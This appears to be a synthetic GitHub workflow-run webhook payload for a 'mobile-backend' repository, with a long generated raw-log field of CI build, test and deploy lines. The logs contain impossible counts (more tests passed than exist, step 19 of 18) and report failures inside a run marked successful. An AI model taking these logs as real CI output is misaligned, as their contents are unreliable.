{
  "action": "completed",
  "workflow_run": {
    "id": 210,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "b47a0aa840ee330357b4f6e6817f2fb59a759108",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-16T12:46:17.819630Z",
    "updated_at": "2025-12-16T12:50:28.577461Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_node ===\nFAILED: test_auth_login\nnpm install: resolved 188 packages\nArtifact uploaded: build.tar.gz (44MB)\nnpm install: resolved 1681 packages\nArtifact downloaded: 12MB\nOK\nInstalling webpack@4.5.4\nWaiting...\n\u2713 Step 'checkout' succeeded\nConnection established\n[12:46:17] DEBUG: Initializing service\nWARNING: lodash has known vulnerabilities\n[12:46:17] INFO: Connecting to database\nyarn add: Done in 16.52s\nLoading...\n  PASS: unit/test_db_connect.spec.js\n  PASS: test_cache_hit (8ms)\n[12:46:17] DEBUG: Memory usage: 1947MB\nSuccess!\nTime: 13.889s\nDone.\nTime: 96.87s\nCompiling lib/index.js...\nArtifact uploaded: dist.zip (10MB)\nSuccess!\nGenerating source maps...\n[12:46:17] DEBUG: Initializing service\nInstalling lodash@5.17.3\nTransforming 197 files...\nStep 3/24: Testing\nMinifying vendor.js\nVerifying...\nBundling styles.css\nCompiling src/handler.rs...\nBundling runtime.css\nUsing Node.js 18.18.6\nCompiling src/utils.go...\npip install: Successfully installed axios-3.2\nHEAD is now at 07cae83\nCompleted.\nCoverage: 71% statements, 87% branches\nFAILED: test_api_health\nLayer 9/10: ENV command\nCreating production build...\nLoading...\nCompiling components/utils.go...\nStep 10/23: Building\nStep 12/15: Testing\n[12:46:17] DEBUG: Initializing service\nProcessing...\nOptimizing 98 modules...\nyarn add: Done in 14.91s\n[12:46:17] DEBUG: Query executed in 11ms\nCompiling utils/service.java...\nCompiling utils/index.js...\n\u2713 deploy completed\nFetching submodules...\nWARNING: react has known vulnerabilities\nCache hit for key-5110\nConnection established\nFetching submodules...\nFetching submodules...\nnpm notice: created a lockfile\nImage pulled successfully\n  PASS: test_db_connect (460ms)\nTransforming 757 files...\nCompiling components/handler.rs...\n  PASS: e2e/test_api_health.spec.js\nNODE_ENV=test\nConnection established\nCache restored successfully (415MB)\nGET /status - 201 (95ms)\n[12:46:17] DEBUG: Query executed in 8ms\nCreating production build...\nUploading artifact 'dist' (33 files)\nReady.\nCache saved successfully\n\u2717 build failed with exit code 103\nChecking out master branch\n\u2713 Task completed in 1377ms\n\u2713 test completed\nReady.\nCompiling src/handler.rs...\n[12:46:17] DEBUG: Connection pool: 14 active\n\u2713 Task completed in 2422ms\n\u2713 All checks passed\nStep 6/20: Running migrations\n[12:46:17] INFO: Connecting to database\nWARNING: react has known vulnerabilities\n\u2717 build failed with exit code 85\npip: Downloading webpack-5.10.tar.gz\nyarn add: Done in 11.25s\nCache saved successfully\nOptimizing 67 modules...\nSuccess!\nStep 19/18: Running migrations\nDone.\nTest Suites: 13 passed, 22 total\nStep 17/16: Linting\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\n[12:46:17] DEBUG: Memory usage: 1483MB\nPlatform: darwin-arm64\nTest Suites: 6 passed, 22 total\n[12:46:17] INFO: Cache refreshed\n[12:46:17] INFO: Request completed\npip: Collecting lodash\nWARNING: prettier has known vulnerabilities\nTest Suites: 34 passed, 41 total\nStep 18/19: Running migrations\nArtifact downloaded: 30MB\nTest Suites: 14 passed, 22 total\nFetching submodules...\nCompleted.\nTests: 251 passed, 84 total\nRan 114 tests in 28s\nEnvironment: staging\nCache miss for key-7288\nNODE_ENV=development\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: axios has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nLayer 5/8: RUN command\nConnection established\nCompleted.\nCache miss for key-6161\nSwitched to branch 'bugfix/task-661'\nArtifact uploaded: build.tar.gz (26MB)\n  PASS: integration/test_user_create.spec.js\nOK\nCache restored successfully (326MB)\nVerifying...\n  PASS: test_db_connect (468ms)\nCache saved successfully\n[12:46:17] INFO: Starting build process\nSnapshots: 9 passed, 15 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\nPushing to registry...\nPlatform: darwin-arm64\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nBundling vendor.css\nArtifact uploaded: build.tar.gz (7MB)\nInstalling lodash@3.3.10\nFetching from https://pypi.org/package.json\nArtifact uploaded: build.tar.gz (20MB)\nImage pulled successfully\n[12:46:17] DEBUG: Connection pool: 2 active\npip install: Successfully installed lodash-3.17\nLoading...\n[12:46:17] DEBUG: Loading configuration\nCache miss for key-5318\n=== Step setup_node completed ===\n=== Step: save_cache ===\nnpm notice: created a lockfile\nBundling vendor.css\nTest Suites: 36 passed, 21 total\nAlready up to date.\nNODE_ENV=test\nPushing to registry...\nCache saved successfully\nCompleted.\nWARNING: jest has known vulnerabilities\n[12:46:17] INFO: Connecting to database\nBundling styles.css\npip: Downloading express-2.6.tar.gz\nCreating production build...\nnpm install: resolved 1859 packages\nReady.\nPlatform: darwin-arm64\nDone.\nPushing to registry...\nCompiling lib/main.py...\n\u2713 validate completed\nCache hit for key-6332\nRan 176 tests in 54s\n  PASS: e2e/test_auth_login.spec.js\nStep 16/25: Building\nStep 11/18: Testing\nAlready up to date.\nOK\nHEAD is now at 0bfb00f\nCompiling components/utils.go...\nLoading...\nCache invalidated: build\nTLS handshake completed\nInstalling jest@2.10.4\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nVerifying...\nWARNING: react has known vulnerabilities\n  PASS: test_user_create (178ms)\nStep 14/18: Running migrations\npip install: Successfully installed lodash-1.3\n[12:46:17] INFO: Processing request\n[12:46:17] INFO: Starting build process\nArtifact uploaded: dist.zip (37MB)\n[12:46:17] WARN: Deprecated API usage\nBundling styles.css\nCreating production build...\nPOST /data - 202 (414ms)\nGenerating source maps...\nOptimizing 93 modules...\n[12:46:17] ERROR: Connection failed\nPlatform: linux-x64\n[12:46:17] WARN: Deprecated API usage\n[12:46:17] DEBUG: Loading configuration\nCompiling src/index.js...\nStep 6/20: Installing dependencies\nEnvironment: test\nnpm install: added 483 packages\nWaiting...\n[12:46:17] DEBUG: Connection pool: 19 active\nCompiling lib/utils.go...\nSuccess!\npip install: Successfully installed jest-2.8\nPulling image: alpine:latest\nAlready up to date.\npip install: Successfully installed express-1.14\nLoading...\nCache invalidated: dependencies\nStep 17/20: Testing\n[12:46:17] WARN: Deprecated API usage\nProcessing...\nCoverage: 81% statements, 61% branches\nPOST /data - 200 (201ms)\n[12:46:17] INFO: Request completed\n\u2713 lint completed\nStep 2/20: Testing\nRan 193 tests in 9s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 258 passed, 82 total\nnpm install: resolved 1581 packages\nPushing to registry...\nGET /health - 201 (33ms)\nStep 19/20: Deploying\nCache miss for key-3736\nTests: 165 passed, 488 total\nCoverage: 87% statements, 93% branches\nHEAD is now at 5aed354\nGenerating source maps...\n[12:46:17] WARN: Deprecated API usage\nReady.\nBundling vendor.css\nFetching from https://amazonaws.com/package.json\nReady.\nCompiling utils/index.js...\nCache saved successfully\n[12:46:17] INFO: Processing request\nUploading artifact 'build' (27 files)\nTest Suites: 31 passed, 49 total\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache miss for key-6455\nStep 8/22: Deploying\n[12:46:17] INFO: Connecting to database\nCompleted.\n[12:46:17] WARN: Deprecated API usage\n\u2713 Step 'build' succeeded\nCache restored successfully (84MB)\nStep 6/16: Installing dependencies\npip: Collecting prettier\nBuilding Docker image...\nRan 77 tests in 6s\nPOST /api - 200 (13ms)\nMinifying app.js\n[12:46:17] WARN: Deprecated API usage\nCache saved successfully\nCoverage: 94% statements, 94% branches\nPlatform: linux-x64\n[12:46:17] ERROR: Connection failed\nUploading artifact 'dist' (42 files)\nFetching from https://pypi.org/package.json\nCompiling src/utils.go...\n[12:46:17] DEBUG: Loading configuration\nMinifying vendor.js\nStep 3/15: Linting\nGET /health - 200 (25ms)\n[12:46:17] INFO: Connecting to database\n[12:46:17] INFO: Request completed\nPlatform: win32-x64\nTLS handshake completed\nCache miss for key-3473\nProcessing...\nConnection established\nnpm install: added 405 packages\nImage pulled successfully\nLayer 10/10: RUN command\n[12:46:17] WARN: Deprecated API usage\nPushing to registry...\nArtifact uploaded: dist.zip (20MB)\nStep 8/22: Testing\nStep 13/17: Deploying\nConnection established\nInstalling lodash@5.5.8\nTests: 84 passed, 111 total\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:17] DEBUG: Query executed in 49ms\nCompiling utils/main.py...\nWARNING: express has known vulnerabilities\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nBuilding Docker image...\nEnvironment: production\n  PASS: e2e/test_cache_hit.spec.js\nNODE_ENV=test\nImage pulled successfully\n=== Step save_cache completed ===\n=== Step: type_check ===\nTLS handshake completed\nEnvironment: production\npip: Collecting axios\nStep 12/25: Testing\nRan 63 tests in 24s\nInstalling prettier@5.9.1\n  PASS: test_user_create (39ms)\nDone.\nException: ValueError\n[12:46:17] WARN: Deprecated API usage\nBuilding Docker image...\nVerifying...\nWARNING: express has known vulnerabilities\n[12:46:17] DEBUG: Loading configuration\nCache invalidated: dependencies\nTests: 80 passed, 196 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nMinifying vendor.js\n[12:46:17] INFO: Cache refreshed\nStep 11/22: Building\nTransforming 526 files...\n[12:46:17] INFO: Connecting to database\nAlready up to date.\n  PASS: integration/test_db_connect.spec.js\nFetching from https://googleapis.com/package.json\nConnection established\nStep 14/24: Linting\n[12:46:17] WARN: Deprecated API usage\nCompiling components/service.java...\nTLS handshake completed\nAlready up to date.\n[12:46:17] WARN: Deprecated API usage\nTransforming 900 files...\nMinifying app.js\n[12:46:17] WARN: Deprecated API usage\n[12:46:17] DEBUG: Loading configuration\n\u2713 Step 'build' succeeded\nOptimizing 66 modules...\n[12:46:17] DEBUG: Memory usage: 1732MB\nBuilding Docker image...\nStep 6/25: Linting\n[12:46:17] WARN: Deprecated API usage\nCompiling utils/app.ts...\nSuccess!\nSuccess!\n[12:46:17] DEBUG: Connection pool: 8 active\n[12:46:17] INFO: Processing request\nCreating production build...\nUsing Python 3.12\nCompiling lib/service.java...\nMinifying vendor.js\nBundling styles.js\nTransforming 215 files...\nCreating production build...\nPlatform: darwin-arm64\nStep 12/17: Deploying\nStep 19/16: Running migrations\nBundling styles.js\nCompiling src/app.ts...\nWARNING: prettier has known vulnerabilities\nCompiling utils/main.py...\nImage pulled successfully\n\u2713 Step 'checkout' succeeded\nnpm install: resolved 1462 packages\nCache invalidated: node_modules\nArtifact uploaded: dist.zip (37MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: package.json updated\nFetching submodules...\nCache hit for key-6077\nnpm notice: package.json updated\n\u2717 build failed with exit code 49\n\u2713 All checks passed\nLayer 4/9: COPY command\nInstalling webpack@5.11.0\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nImage pulled successfully\nTests: 168 passed, 327 total\n[12:46:17] INFO: Starting build process\nBuilding Docker image...\npip: Downloading prettier-5.3.tar.gz\n\u2713 Task completed in 2907ms\nnpm install: added 281 packages\nPushing to registry...\nPushing to registry...\nTest Suites: 49 passed, 48 total\nMinifying vendor.js\n\u2713 Task completed in 1244ms\nLayer 8/11: COPY command\npip: Downloading webpack-3.6.tar.gz\nCompiling src/handler.rs...\nStep 19/18: Building\n[12:46:17] DEBUG: Connection pool: 19 active\n[12:46:17] DEBUG: Memory usage: 1064MB\nCache restored successfully (476MB)\nTests: 167 passed, 191 total\nBuilding Docker image...\nTLS handshake completed\n\u2713 All checks passed\n  PASS: test_api_health (333ms)\n[12:46:17] DEBUG: Initializing service\n[12:46:17] WARN: Deprecated API usage\nAlready up to date.\nArtifact uploaded: dist.zip (7MB)\nCompiling components/utils.go...\n[12:46:17] DEBUG: Loading configuration\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nUsing Node.js 20.14.4\nnpm notice: created a lockfile\nUploading artifact 'coverage' (11 files)\nPlatform: win32-x64\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nCache restored successfully (124MB)\nSwitched to branch 'feature/task-891'\nUploading artifact 'build' (48 files)\nUsing Python 3.9\nnpm notice: created a lockfile\nCache restored successfully (168MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 662 files...\n\u2713 All checks passed\nFetching from https://github.com/package.json\nRan 199 tests in 7s\nnpm notice: package.json updated\nCache miss for key-5981\nMinifying app.js\nCache invalidated: dependencies\nGenerating source maps...\n\u2713 Task completed in 3860ms\nArtifact downloaded: 39MB\n\u2713 Step 'install' succeeded\nArtifact uploaded: dist.zip (87MB)\n[12:46:17] DEBUG: Memory usage: 321MB\n[12:46:17] DEBUG: Memory usage: 1755MB\nEnvironment: development\npip: Installing build dependencies...\nPulling image: python:latest\nnpm notice: package.json updated\nSuccess!\nDone.\n[12:46:17] WARN: Deprecated API usage\nTests: 466 passed, 70 total\n[12:46:17] INFO: Connecting to database\nCompiling src/utils.go...\nSwitched to branch 'hotfix/task-343'\nCoverage: 94% statements, 89% branches\nSwitched to branch 'bugfix/task-269'\nBuilding Docker image...\n=== Step type_check completed ===\n=== Step: deploy_production ===\nTransforming 230 files...\nEnvironment: staging\nDone.\nWARNING: prettier has known vulnerabilities\n\u2713 All checks passed\nCompiling components/utils.go...\nGET /status - 204 (97ms)\nPlatform: linux-x64\nEnvironment: development\nStep 12/16: Linting\n[12:46:17] INFO: Cache refreshed\nMinifying main.js\nOptimizing 73 modules...\n[12:46:17] INFO: Cache refreshed\n[12:46:17] INFO: Connecting to database\nNODE_ENV=production\nReady.\npip: Collecting react\n[12:46:17] DEBUG: Connection pool: 12 active\nEnvironment: development\nnpm notice: package.json updated\nProcessing...\nHEAD is now at 803953e\nnpm install: added 325 packages\n\u2713 Task completed in 3398ms\npip: Downloading react-3.12.tar.gz\nArtifact downloaded: 42MB\n[12:46:17] DEBUG: Loading configuration\nTime: 44.795s\nSnapshots: 38 passed, 48 total\nTests: 226 passed, 366 total\nStep 12/25: Running migrations\nLayer 9/15: RUN command\nCompiling utils/service.java...\nOK\nLayer 4/9: COPY command\n[12:46:17] INFO: Connecting to database\nCache saved successfully\nHEAD is now at ff4f1b8\npip: Collecting prettier\nCompiling src/index.js...\n  PASS: integration/test_api_health.spec.js\nCompiling src/utils.go...\nGenerating source maps...\nArtifact uploaded: dist.zip (52MB)\nPlatform: linux-x64\nStep 2/23: Linting\nRan 28 tests in 32s\nCache saved successfully\nTest Suites: 19 passed, 30 total\nCache miss for key-7684\nyarn add: Done in 14.63s\nVerifying...\n\u2713 test completed\nCompiling components/service.java...\n[12:46:17] DEBUG: Loading configuration\nInstalling express@4.14.1\nOK\nCompiling lib/index.js...\nTLS handshake completed\n\u2717 build failed with exit code 116\n[12:46:17] INFO: Connecting to database\nCreating production build...\nStep 1/24: Deploying\nLoading...\nRan 119 tests in 1s\nChecking out master branch\n\u2713 Step 'build' succeeded\n[12:46:17] DEBUG: Connection pool: 19 active\nyarn add: Done in 24.13s\n[12:46:17] INFO: Cache refreshed\nFAILED: test_db_connect\n\u2713 All checks passed\nStep 2/23: Deploying\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling utils/main.py...\nTest Suites: 49 passed, 26 total\nFAILED: test_db_connect\nCache saved successfully\nEnvironment: staging\n[12:46:17] INFO: Request completed\nUsing Python 3.11\nnpm install: added 136 packages\nFetching submodules...\nImage pulled successfully\nTransforming 665 files...\nCoverage: 80% statements, 76% branches\nImage pulled successfully\nLoading...\nArtifact uploaded: build.tar.gz (15MB)\nArtifact downloaded: 6MB\nArtifact downloaded: 16MB\nFinished.\nTLS handshake completed\nDone.\nPushing to registry...\n[12:46:17] WARN: Deprecated API usage\n\u2713 Step 'install' succeeded\nDone.\nRan 81 tests in 7s\nWARNING: react has known vulnerabilities\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading prettier-1.15.tar.gz\nCompiling components/utils.go...\nWARNING: jest has known vulnerabilities\nImage pulled successfully\nGET /status - 201 (85ms)\nMinifying app.js\nGenerating source maps...\n[12:46:17] WARN: Deprecated API usage\nCache hit for key-4050\npip: Downloading prettier-2.7.tar.gz\n[12:46:17] WARN: Deprecated API usage\nHEAD is now at 88d7dea\nyarn add: Done in 10.90s\nTime: 99.31s\nWARNING: axios has known vulnerabilities\nTLS handshake completed\n  PASS: test_user_create (288ms)\nArtifact uploaded: dist.zip (58MB)\nConnection established\nOK\nFinished.\nBundling styles.css\nCompleted.\n[12:46:17] WARN: Deprecated API usage\nUsing Python 3.11\nnpm install: added 307 packages\nStep 6/19: Running migrations\nCache miss for key-9486\nCache hit for key-5513\nWARNING: react has known vulnerabilities\n[12:46:17] WARN: Deprecated API usage\nRan 182 tests in 11s\nFetching from https://npmjs.org/package.json\npip install: Successfully installed eslint-1.12\n\u2713 lint completed\nStep 4/19: Deploying\nTLS handshake completed\nUploading artifact 'coverage' (40 files)\n[12:46:17] WARN: Deprecated API usage\nPulling image: alpine:latest\nFetching from https://pypi.org/package.json\n  PASS: test_api_health (275ms)\n[12:46:17] INFO: Starting build process\nFAILED: test_api_health\nArtifact downloaded: 7MB\nArtifact downloaded: 14MB\nCoverage: 96% statements, 77% branches\nnpm notice: created a lockfile\n=== Step deploy_production completed ===\n=== Step: setup_environment ===\nUsing Node.js 19.16.5\nArtifact uploaded: build.tar.gz (27MB)\n[12:46:17] DEBUG: Initializing service\nOK\nTransforming 564 files...\nGET /status - 204 (81ms)\n\u2713 Step 'setup' succeeded\nEnvironment: test\n[12:46:17] ERROR: Connection failed\n\u2713 Task completed in 919ms\npip install: Successfully installed webpack-3.3\nInstalling react@4.9.10\nyarn add: Done in 30.84s\nnpm install: resolved 1162 packages\nMinifying app.js\nCompiling components/index.js...\nStep 13/20: Testing\nStep 11/17: Testing\n\u2713 build completed\nLayer 2/15: ENV command\nUsing Node.js 16.19.2\nOptimizing 32 modules...\n[12:46:17] INFO: Connecting to database\nCompleted.\nStep 12/19: Deploying\n[12:46:17] DEBUG: Loading configuration\nFinished.\n\u2713 Step 'install' succeeded\n[12:46:17] WARN: Deprecated API usage\nCompleted.\nSnapshots: 35 passed, 47 total\n[12:46:17] INFO: Processing request\nStep 9/16: Testing\nOK\nnpm install: added 113 packages\nStep 2/17: Testing\nCache miss for key-6909\nArtifact uploaded: dist.zip (11MB)\nFinished.\nCache hit for key-6513\nCompiling utils/utils.go...\n[12:46:17] ERROR: Connection failed\nArtifact uploaded: dist.zip (95MB)\nConnection established\n[12:46:17] DEBUG: Loading configuration\nCoverage: 93% statements, 90% branches\nProcessing...\npip: Collecting webpack\nUsing Node.js 20.18.0\nTest Suites: 37 passed, 30 total\nWaiting...\n[12:46:17] INFO: Cache refreshed\n[12:46:17] INFO: Cache refreshed\nArtifact uploaded: dist.zip (57MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:17] INFO: Starting build process\nCache miss for key-9561\nBuilding Docker image...\nCache restored successfully (438MB)\nUsing Python 3.10\nCompiling utils/handler.rs...\nSnapshots: 47 passed, 46 total\nArtifact uploaded: build.tar.gz (15MB)\n[12:46:17] ERROR: Connection failed\nStep 18/21: Deploying\n  PASS: integration/test_db_connect.spec.js\nSnapshots: 15 passed, 25 total\nnpm notice: created a lockfile\nRan 124 tests in 56s\nReady.\nTLS handshake completed\nGET /status - 200 (99ms)\nnpm notice: created a lockfile\nImage pulled successfully\nSwitched to branch 'hotfix/task-453'\nCompiling src/utils.go...\n[12:46:17] INFO: Starting build process\nCache hit for key-7006\n[12:46:17] INFO: Connecting to database\nHEAD is now at 7a88380\nPOST /api - 201 (230ms)\n\u2713 deploy completed\n  PASS: test_db_connect (281ms)\nCompiling src/index.js...\n  PASS: test_auth_login (237ms)\n[12:46:17] DEBUG: Memory usage: 1031MB\nnpm install: resolved 801 packages\nFinished.\nPlatform: darwin-arm64\nDone.\nWaiting...\nSnapshots: 8 passed, 50 total\n[12:46:17] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-359'\nCompiling src/service.java...\nRan 105 tests in 5s\nWARNING: eslint has known vulnerabilities\n[12:46:17] INFO: Cache refreshed\n[12:46:17] ERROR: Connection failed\npip: Collecting prettier\nSuccess!\nArtifact downloaded: 12MB\nBuilding Docker image...\n[12:46:17] INFO: Connecting to database\npip: Installing build dependencies...\nException: NullPointerException\nCache restored successfully (131MB)\nStep 19/20: Linting\n[12:46:17] DEBUG: Memory usage: 559MB\nReady.\nMinifying app.js\nTransforming 261 files...\nCache miss for key-9725\nProcessing...\nArtifact uploaded: dist.zip (73MB)\n[12:46:17] INFO: Starting build process\nVerifying...\nTime: 118.444s\nWARNING: prettier has known vulnerabilities\nTest Suites: 48 passed, 37 total\nArtifact uploaded: build.tar.gz (38MB)\nStep 6/21: Installing dependencies\nPulling image: alpine:3.11\nGenerating source maps...\n\u2713 test completed\nGET /api - 201 (80ms)\nReady.\nArtifact downloaded: 20MB\nCache miss for key-4339\nProcessing...\nCache miss for key-4754\nTLS handshake completed\nConnection established\nSwitched to branch 'hotfix/task-281'\nCache hit for key-6887\nFetching from https://registry.npmjs.org/package.json\nOK\n[12:46:17] WARN: Deprecated API usage\n\u2713 build completed\nCompleted.\nCoverage: 97% statements, 87% branches\nStep 2/21: Running migrations\nStep 2/19: Linting\nVerifying...\nChecking out develop branch\nRan 15 tests in 37s\nAlready up to date.\nOptimizing 98 modules...\n[12:46:17] DEBUG: Memory usage: 1147MB\nStep 7/16: Running migrations\nSuccess!\nReady.\n\u2717 build failed with exit code 121\n=== Step setup_environment completed ===\n=== Step: checkout ===\n\u2713 Step 'install' succeeded\n[12:46:17] WARN: Deprecated API usage\nTests: 72 passed, 58 total\nLayer 8/11: RUN command\nPOST /api - 201 (416ms)\nyarn add: Done in 6.74s\nGET /health - 201 (80ms)\nCreating production build...\npip: Installing build dependencies...\nArtifact downloaded: 2MB\n\u2713 All checks passed\nImage pulled successfully\nCache restored successfully (422MB)\n\u2713 Step 'test' succeeded\nPOST /upload - 200 (328ms)\n[12:46:17] DEBUG: Query executed in 27ms\nConnection established\npip: Installing build dependencies...\nCoverage: 87% statements, 100% branches\nMinifying app.js\nnpm install: resolved 838 packages\nPOST /api - 201 (343ms)\nChecking out develop branch\n[12:46:17] INFO: Starting build process\n\u2713 deploy completed\nPushing to registry...\nGET /status - 204 (49ms)\nCompiling src/handler.rs...\n[12:46:17] DEBUG: Initializing service\nCache restored successfully (392MB)\nnpm notice: created a lockfile\n[12:46:17] INFO: Processing request\n[12:46:17] DEBUG: Query executed in 86ms\nCompiling src/utils.go...\n\u2713 Task completed in 1465ms\nEnvironment: test\n[12:46:17] DEBUG: Connection pool: 8 active\nTLS handshake completed\nCache saved successfully\nFetching from https://githubusercontent.com/package.json\nPulling image: python:3.11\nHEAD is now at ed77df0\nSnapshots: 41 passed, 25 total\nTransforming 525 files...\nCache hit for key-7171\n[12:46:17] DEBUG: Memory usage: 1548MB\nHEAD is now at c4201e6\nCompiling src/service.java...\nFinished.\nPulling image: alpine:3.11\n\u2713 All checks passed\nnpm install: resolved 1414 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/25: Testing\n[12:46:17] INFO: Request completed\nStep 6/17: Installing dependencies\nFetching submodules...\nStep 9/20: Installing dependencies\nInstalling lodash@4.8.5\npip: Installing build dependencies...\nSwitched to branch 'hotfix/task-485'\nCache miss for key-6300\nStep 5/18: Linting\n[12:46:17] DEBUG: Connection pool: 5 active\n\u2713 Step 'checkout' succeeded\nTransforming 244 files...\n[12:46:17] WARN: Deprecated API usage\nUsing Node.js 14.15.2\n[12:46:17] DEBUG: Query executed in 77ms\n\u2717 build failed with exit code 63\n[12:46:17] DEBUG: Initializing service\npip: Installing build dependencies...\nCompleted.\nTransforming 590 files...\n[12:46:17] INFO: Processing request\n[12:46:17] DEBUG: Query executed in 87ms\nBuilding Docker image...\nCache invalidated: dependencies\npip install: Successfully installed lodash-3.19\nReady.\nPlatform: darwin-arm64\npip install: Successfully installed eslint-5.0\n[12:46:17] DEBUG: Initializing service\nPushing to registry...\n[12:46:17] DEBUG: Connection pool: 14 active\nCompiling src/main.py...\nWaiting...\nEnvironment: production\nTime: 83.615s\nChecking out master branch\nLoading...\nDone.\n[12:46:17] INFO: Connecting to database\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nBuilding Docker image...\nCache hit for key-3159\n[12:46:17] DEBUG: Connection pool: 8 active\nHEAD is now at 7ea711d\nCompiling utils/index.js...\nSnapshots: 25 passed, 10 total\n[12:46:17] WARN: Deprecated API usage\nTLS handshake completed\n\u2713 build completed\npip: Downloading eslint-4.2.tar.gz\nSnapshots: 48 passed, 28 total\nCompiling lib/main.py...\nArtifact uploaded: build.tar.gz (22MB)\n[12:46:17] WARN: Deprecated API usage\nUsing Python 3.12\nLayer 7/10: ENV command\nOptimizing 25 modules...\n\u2713 All checks passed\nCompiling src/service.java...\nRan 128 tests in 46s\npip install: Successfully installed lodash-3.13\nGenerating source maps...\n[12:46:17] INFO: Connecting to database\nSwitched to branch 'bugfix/task-729'\n[12:46:17] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-1853\nWARNING: webpack has known vulnerabilities\nCompiling src/utils.go...\nStep 11/19: Deploying\n[12:46:17] DEBUG: Query executed in 56ms\n  PASS: integration/test_api_health.spec.js\n\u2713 Step 'test' succeeded\nCompleted.\nWARNING: axios has known vulnerabilities\nEnvironment: development\n[12:46:17] DEBUG: Connection pool: 8 active\n[12:46:17] DEBUG: Loading configuration\npip: Collecting axios\nCache restored successfully (305MB)\nInstalling axios@2.18.1\nEnvironment: development\n\u2713 All checks passed\nFAILED: test_cache_hit\nNODE_ENV=production\npip: Installing build dependencies...\nyarn add: Done in 12.82s\nException: RuntimeError\n\u2717 build failed with exit code 24\nCache invalidated: node_modules\n[12:46:17] INFO: Starting build process\nCompleted.\nProcessing...\n[12:46:17] DEBUG: Initializing service\nTest Suites: 46 passed, 46 total\nCache restored successfully (197MB)\nPushing to registry...\nFetching from https://amazonaws.com/package.json\n=== Step checkout completed ===\n=== Step: deploy_staging ===\nCache restored successfully (137MB)\nTest Suites: 40 passed, 23 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-1467\nInstalling lodash@1.20.7\nFAILED: test_cache_hit\n[12:46:17] WARN: Deprecated API usage\nTLS handshake completed\nAlready up to date.\nPlatform: darwin-arm64\n[12:46:17] DEBUG: Connection pool: 16 active\nCompiling components/service.java...\n  PASS: unit/test_user_create.spec.js\nStep 18/17: Linting\nPushing to registry...\nFetching submodules...\nOK\nChecking out develop branch\nTests: 184 passed, 137 total\nStep 14/22: Deploying\nRan 55 tests in 15s\n\u2713 Step 'build' succeeded\nDone.\nWARNING: webpack has known vulnerabilities\nMinifying app.js\npip install: Successfully installed webpack-2.20\nImage pulled successfully\nCreating production build...\nPulling image: node:18\nUsing Python 3.12\n\u2713 All checks passed\n  PASS: e2e/test_auth_login.spec.js\nCompiling utils/utils.go...\nnpm notice: created a lockfile\nCache invalidated: node_modules\nMinifying app.js\nException: NullPointerException\nStep 1/16: Deploying\nnpm notice: package.json updated\nBundling vendor.js\nCompleted.\n[12:46:17] DEBUG: Initializing service\n[12:46:17] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (45MB)\nLoading...\n  PASS: test_api_health (419ms)\n\u2717 build failed with exit code 112\nFetching from https://docker.io/package.json\nCompiling lib/handler.rs...\nCoverage: 86% statements, 84% branches\npip install: Successfully installed webpack-4.12\nWaiting...\nOK\n[12:46:17] ERROR: Connection failed\nFinished.\nTests: 438 passed, 93 total\n\u2713 All checks passed\nCache hit for key-4051\nStep 12/17: Running migrations\n[12:46:17] INFO: Cache refreshed\nnpm notice: package.json updated\n[12:46:17] DEBUG: Memory usage: 1708MB\n  PASS: test_auth_login (194ms)\nAlready up to date.\nUsing Node.js 14.10.1\nTime: 108.456s\n[12:46:17] INFO: Starting build process\nProcessing...\nOK\nDone.\npip install: Successfully installed eslint-4.18\nProcessing...\nCreating production build...\nReady.\nCompiling utils/utils.go...\nWaiting...\nWARNING: lodash has known vulnerabilities\nnpm install: added 128 packages\nStep 16/15: Running migrations\n[12:46:17] DEBUG: Query executed in 61ms\nyarn add: Done in 13.40s\nStep 16/15: Running migrations\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache invalidated: dependencies\nTime: 86.685s\n[12:46:17] DEBUG: Loading configuration\nnpm notice: created a lockfile\nFinished.\nBuilding Docker image...\nEnvironment: staging\nArtifact downloaded: 18MB\nStep 10/25: Deploying\nArtifact downloaded: 9MB\nAlready up to date.\nCompiling lib/app.ts...\nHEAD is now at c9a3eb4\nHEAD is now at 81fda39\nUsing Python 3.10\n  PASS: test_db_connect (110ms)\nnpm notice: created a lockfile\nTLS handshake completed\nTest Suites: 34 passed, 47 total\nLayer 2/8: COPY command\nFetching from https://googleapis.com/package.json\nSnapshots: 40 passed, 24 total\nSnapshots: 32 passed, 5 total\n[12:46:17] DEBUG: Query executed in 2ms\nEnvironment: test\npip: Collecting lodash\nSuccess!\n[12:46:17] INFO: Request completed\npip: Installing build dependencies...\nCache saved successfully\nVerifying...\nCache hit for 